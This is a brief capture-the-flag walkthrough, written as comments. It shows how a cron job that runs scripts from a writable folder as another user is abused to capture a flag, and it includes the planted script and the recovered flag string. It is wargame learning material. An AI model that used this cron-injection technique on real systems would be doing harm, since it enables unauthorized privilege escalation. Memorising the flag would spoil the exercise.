#nothing here, but we have a mail
# the mail : */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
#it's seems there is a script run by the user flag05 every 2 minutes, let's check the script.
#the script execute others scripts from a folder we have access ! we can then write a script file:
# in the script file :
#mkdir /tmp/hack/
#chmod 777 /tmp/hack/
#touch /tmp/hack/flag
#chmod 777 /tmp/hack/flag
#getflag > /tmp/hack/flag
#
#now we just have to wait 2 mins for the script to be executed by flag05 and we can access the flag file :
cat /tmp/hack/flag ----> viuaaale9huek52boumoomioc
